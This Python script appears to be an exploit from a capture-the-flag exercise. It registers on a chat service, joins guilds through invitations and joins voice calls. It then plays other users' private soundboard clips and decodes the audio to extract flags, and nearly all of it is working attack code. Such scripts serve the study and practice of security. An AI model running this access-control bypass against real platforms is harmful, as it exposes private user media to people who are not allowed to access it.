#!/usr/bin/env python3
"""Play an authorized clip and decode the aliased private soundboard audio."""

import io
import json
import os
import select
import shlex
import socket
import subprocess
import sys
import time
import wave
from functools import lru_cache
from pathlib import Path
from urllib.parse import urlsplit

import websocket

from svyaz_common import Client, FLAG, fresh_id, invitations


ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789="
PROBE = Path(__file__).parent / "bin/linux-amd64/voice-probe"
VOICE_ATLAS = Path(__file__).parent / "assets/voice-alphabet.wav"
VOICE_SAMPLES = 2400


@lru_cache(maxsize=1)
def voice_symbols():
    with wave.open(str(VOICE_ATLAS), "rb") as sound:
        if (sound.getnchannels(), sound.getsampwidth(), sound.getframerate()) != (1, 2, 8000):
            raise ValueError("invalid voice atlas")
        pcm = sound.readframes(sound.getnframes())
    stride = VOICE_SAMPLES * 2
    if len(pcm) != len(ALPHABET) * stride:
        raise ValueError("invalid voice atlas length")
    return {pcm[i * stride:(i + 1) * stride]: char for i, char in enumerate(ALPHABET)}


def decode_wave(data):
    with wave.open(io.BytesIO(data), "rb") as sound:
        if (sound.getnchannels(), sound.getsampwidth(), sound.getframerate()) != (1, 2, 8000):
            return None
        pcm = sound.readframes(sound.getnframes())
    if len(pcm) != 32 * VOICE_SAMPLES * 2:
        return None
    symbols = voice_symbols()
    stride = VOICE_SAMPLES * 2
    try:
        value = "".join(symbols[pcm[i * stride:(i + 1) * stride]] for i in range(32))
    except KeyError:
        return None
    return value if FLAG.fullmatch(value) else None


def candidate_ip(target):
    override = os.getenv("SVYAZ_PROBE_IP")
    if override:
        return override
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as route:
        route.connect((target, 20000))
        return route.getsockname()[0]


class Probe:
    def __init__(self):
        command = shlex.split(os.getenv("SVYAZ_PROBE_CMD", str(PROBE)))
        self.process = subprocess.Popen(
            command, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL, text=True, bufsize=1,
        )

    def command(self, op, peer_id, **fields):
        tag = fresh_id()
        self.process.stdin.write(json.dumps({"op": op, "id": peer_id, "tag": tag, **fields}) + "\n")
        self.process.stdin.flush()
        ready, _, _ = select.select([self.process.stdout], [], [], 12)
        if not ready:
            raise TimeoutError(f"probe {op} timed out")
        line = self.process.stdout.readline()
        if not line:
            raise RuntimeError("probe exited")
        answer = json.loads(line)
        if answer.get("tag") != tag or answer.get("error"):
            raise RuntimeError(f"probe {op}: {answer}")
        return answer["data"]

    def close(self):
        if self.process.poll() is None:
            self.process.stdin.close()
            try:
                self.process.wait(timeout=2)
            except subprocess.TimeoutExpired:
                self.process.terminate()


class Call:
    def __init__(self, client, room):
        self.client = client
        grant = client.api("GET", f"/channels/{room}/voice-access?device_id={fresh_id()}&call_id={fresh_id()}")["grant"]
        netloc = urlsplit(client.base).netloc
        scheme = "wss" if client.base.startswith("https://") else "ws"
        cookies = "; ".join(f"{name}={value}" for name, value in client.session.cookies.get_dict().items())
        self.ws = websocket.create_connection(
            f"{scheme}://{netloc}/api/v1/voice/ws", timeout=12,
            origin=client.base, header=["Cookie: " + cookies],
        )
        self.backlog = []
        hello = self.command("join", grant=grant)
        if hello.get("op") != "hello":
            raise RuntimeError(f"voice join failed: {hello}")

    def frame(self):
        return json.loads(self.ws.recv())

    def command(self, op, **fields):
        request_id = fresh_id()
        self.ws.send(json.dumps({"schema_version": 1, "op": op, "request_id": request_id, **fields}))
        deadline = time.monotonic() + 12
        while time.monotonic() < deadline:
            frame = self.frame()
            if frame.get("request_id") == request_id:
                return frame
            self.backlog.append(frame)
        raise TimeoutError(f"voice {op} timed out")

    def event(self, name):
        deadline = time.monotonic() + 12
        while time.monotonic() < deadline:
            for index, frame in enumerate(self.backlog):
                if frame.get("op") == name:
                    return self.backlog.pop(index)
            self.backlog.append(self.frame())
        raise TimeoutError(f"voice {name} timed out")

    def connect(self, probe, peer_id, bind_ip):
        offer = probe.command("create", peer_id, ip=bind_ip)["sdp"]
        answer = self.command("offer", sdp=offer)
        if answer.get("op") != "answer":
            raise RuntimeError(f"voice offer failed: {answer}")
        probe.command("answer", peer_id, sdp=answer["sdp"])
        self.event("connected")
        deadline = time.monotonic() + 10
        while time.monotonic() < deadline:
            if probe.command("stats", peer_id)["connected"]:
                return
            time.sleep(0.1)
        raise TimeoutError("WebRTC peer did not connect")

    def play(self, sound_id):
        result = self.command("play_sound", sound_id=sound_id)
        if result.get("op") != "ack":
            raise RuntimeError(f"play_sound failed: {result}")
        event = self.event("sound_played")
        url = event["audio_url"]
        if not url.startswith("/api/v1/"):
            raise RuntimeError("unexpected sound URL")
        return self.client.api("GET", url[len("/api/v1"):], raw=True)

    def close(self):
        self.ws.close()


def exploit(ip, invite):
    client = Client(ip).register()
    guild_id = client.join(invite)["guild_id"]
    rooms = [room for room in client.channels(guild_id)
             if room.get("kind") == "VOICE" and room.get("name") == "briefing"]
    if not rooms:
        return []
    flags = []
    bind_ip = candidate_ip(ip)
    with_probe = Probe()
    try:
        for room in rooms:
            clips = [clip for clip in client.api("GET", f"/channels/{room['id']}/sounds").get("items", [])
                     if not clip.get("builtin") and clip.get("content_type") == "audio/wav"]
            if not clips:
                continue
            call = Call(client, room["id"])
            peer_id = fresh_id()
            try:
                call.connect(with_probe, peer_id, bind_ip)
                for clip in clips:
                    flag = decode_wave(call.play(clip["id"]))
                    if flag:
                        flags.append(flag)
            finally:
                call.close()
                with_probe.command("close", peer_id)
    finally:
        with_probe.close()
    return flags


def main(ip):
    seen = set()
    for invite in invitations(ip):
        try:
            for flag in exploit(ip, invite):
                if flag not in seen:
                    seen.add(flag)
                    print(flag, flush=True)
        except Exception as exc:
            print(f"sound {invite[:8]}: {exc}", file=sys.stderr)


if __name__ == "__main__":
    main(sys.argv[1])
